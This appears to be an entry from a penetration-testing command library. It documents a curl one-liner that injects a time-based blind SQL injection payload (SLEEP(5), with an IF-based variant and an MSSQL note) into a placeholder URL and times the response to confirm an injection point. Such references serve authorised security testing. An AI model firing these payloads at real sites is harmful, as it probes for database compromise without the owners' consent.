---
data: >-
  curl "http://target.com/vulnerable/path' AND SLEEP(5); --" -w
  "%{time_total}\n" -s -o /dev/null
tags:
  - sqli
  - testing
  - web
type: command
output: |
  5.123
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: d7562884-511d-4577-bd31-e3cafba261e4
created_at: '2025-12-14T17:26:17.737Z'
updated_at: '2025-12-14T17:26:17.737Z'
verified: false
validated: true
submitted: true
---
# curl-test-time-based-sqli

## Command

```bash
curl "http://target.com/vulnerable/path' AND SLEEP(5); --" -w "%{time_total}\n" -s -o /dev/null
```

## Description

This command tests for time-based blind SQL injection by injecting a SLEEP payload into the URI path and measuring the total response time to detect delays indicative of successful injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"http://target.com/vulnerable/path' AND SLEEP(5); --"` | The target URL with injected SQL payload (adjust for DBMS, e.g., WAITFOR DELAY '0:0:5' for MSSQL) | Yes |
| `-w "%{time_total}\n"` | Writes the total time taken for the transfer to stdout | Yes |
| `-s` | Silent mode, no progress meter | Yes |
| `-o /dev/null` | Discard output to focus on timing | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/vulnerable/path' AND SLEEP(5); --" -w "%{time_total}\n" -s -o /dev/null
```

### Advanced Usage

```bash
curl "http://target.com/vulnerable/path' AND IF(1=1, SLEEP(5), 0); --" -w "%{time_total}\n" --max-time 10 -s -o /dev/null
```

## Expected Output

A numeric value representing seconds (e.g., 5.123), where a delay matching the SLEEP duration confirms the injection point.

## Related

- [[Related Procedure|procedures/Exploit-Time-Based-Blind-SQL-Injection]]
